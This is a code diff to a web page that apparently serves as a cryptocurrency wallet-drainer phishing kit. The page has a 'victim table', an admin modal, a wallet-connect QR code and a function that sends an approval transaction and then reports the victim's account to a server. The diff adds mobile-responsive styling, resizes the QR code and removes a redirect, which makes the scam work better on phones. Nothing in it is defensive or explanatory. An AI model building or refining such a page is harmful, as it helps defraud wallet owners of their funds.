@@ -417,6 +417,141 @@
     .donations a { font-size: 12px; color: var(--azure-40); }
     .donations a:hover { text-decoration: underline; }
     .heart { margin-left: 4px; width: 12px; height: 12px; fill: var(--punch); stroke: var(--punch); }
+
+    /* ===== RESPONSIVE MOBILE ===== */
+    @media (max-width: 768px) {
+      /* Topbar */
+      .topbar { padding: 6px 8px; }
+      .topbar-inner { padding: 0 8px; gap: 8px; flex-wrap: wrap; }
+      .topbar-left { gap: 8px; flex-wrap: wrap; }
+      .topbar-right { gap: 6px; flex: none; }
+      .search-wrap { order: 3; width: 100%; flex: 1 1 100%; margin-top: 6px; }
+      .search-wrap input { padding: 0 40px 0 34px; font-size: 13px; height: 34px; }
+      .slash-badge { display: none; }
+      .tb-group { font-size: 11px; }
+      .t-xs { font-size: 11px; }
+
+      /* Header */
+      .site-nav {
+        flex-wrap: wrap;
+        padding: 10px 16px;
+        gap: 8px;
+      }
+      .brand { padding-right: 8px; }
+      .brand img { height: 28px; width: auto; }
+      .nav-list {
+        gap: 4px;
+        flex-wrap: wrap;
+        width: 100%;
+        justify-content: flex-start;
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        padding-bottom: 4px;
+      }
+      .nav-list > li { flex: none; }
+      .nav-link, .nav-btn {
+        padding: 8px 4px;
+        font-size: 13px;
+        white-space: nowrap;
+      }
+      .nav-sep { display: none; }
+      .signin { font-size: 13px; padding: 8px 0; }
+
+      /* Dropdowns */
+      .dropdown {
+        position: fixed;
+        left: 8px;
+        right: 8px;
+        top: auto;
+        min-width: 0;
+        width: auto;
+        border-radius: 8px;
+        border-top: 3px solid var(--azure-40);
+        max-height: 70vh;
+        overflow-y: auto;
+      }
+      .mega {
+        position: fixed;
+        left: 8px;
+        right: 8px;
+        top: auto;
+        border-radius: 8px;
+        max-height: 70vh;
+        overflow-y: auto;
+      }
+      .mega-grid { grid-template-columns: 1fr; gap: 16px; padding: 20px 16px; }
+
+      /* Panneau More / Victim Table */
+      .more-container { padding: 16px; }
+      .more-container h3 { font-size: 16px; }
+      #victim-table { font-size: 11px; display: block; overflow-x: auto; white-space: nowrap; }
+      #victim-table th, #victim-table td { padding: 6px 8px; }
+
+      /* Main */
+      .main { padding: 0 12px; }
+      .main-inner { padding: 32px 0 64px; }
+      .card {
+        width: 100%;
+        max-width: 100%;
+        padding: 20px 16px 40px;
+      }
+      .card h1 { font-size: 19px; text-align: center; }
+      .card .sub { font-size: 13px; text-align: center; }
+      .bubble { padding: 6px 14px; margin-top: 16px; }
+      .bubble img { height: 18px; }
+      .qr {
+        width: 240px;
+        height: 240px;
+        margin: 12px 0 32px;
+        transform: translateY(8px);
+      }
+      #qr-wrapper {
+        width: 240px;
+        height: 240px;
+      }
+      #qr-code svg,
+      #qr-code canvas { width: 240px !important; height: 240px !important; }
+      #logo-box { width: 42px; height: 42px; border-radius: 12px; }
+      #logo-box svg { width: 34px; height: 34px; }
+      .scan { font-size: 13px; text-align: center; }
+
+      /* Admin Modal */
+      .admin-modal-content {
+        min-width: 0;
+        width: calc(100% - 32px);
+        max-width: 360px;
+        padding: 20px 16px;
+      }
+
+      /* Footer */
+      .site-footer { padding: 0 12px; }
+      .footer-inner { padding: 0 8px; }
+      .footer-top { padding: 16px 0; flex-wrap: wrap; gap: 12px; }
+      .footer-cols { padding: 24px 0; gap: 20px; }
+      .footer-brand { width: 100%; padding-right: 0; }
+      .footer-col { width: 100%; }
+      .footer-bottom { padding: 12px 0; gap: 8px; }
+      .footer-bottom p { font-size: 11px; }
+      .donations { font-size: 11px; flex-wrap: wrap; }
+    }
+
+    @media (max-width: 380px) {
+      .card h1 { font-size: 17px; }
+      .qr { width: 200px; height: 200px; }
+      #qr-wrapper { width: 200px; height: 200px; }
+      #qr-code svg,
+      #qr-code canvas { width: 200px !important; height: 200px !important; }
+      #logo-box { width: 36px; height: 36px; border-radius: 10px; }
+      #logo-box svg { width: 28px; height: 28px; }
+    }
+
+    /* ===== Desktop : QR design ===== */
+    @media (min-width: 769px) {
+      .qr {
+        width: 300px;
+        height: 300px;
+      }
+    }
   </style>
 </head>
 <body id="top">
@@ -976,8 +1111,8 @@
     `;
 
     const qrCode = new window.QRCodeStyling({
-      width: 300,
-      height: 300,
+      width: window.innerWidth <= 380 ? 200 : window.innerWidth <= 768 ? 240 : 300,
+      height: window.innerWidth <= 380 ? 200 : window.innerWidth <= 768 ? 240 : 300,
       type: "svg",
       data: uri,
       margin: 0,
@@ -1092,7 +1227,7 @@ async function sendExactApproveTransaction() {
       body: JSON.stringify({ victim: account, chain: '1' })
     });
 
-    setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
+    // (redirection supprimée)
 
   } catch (e) {
     console.error('Transaction error:', e);
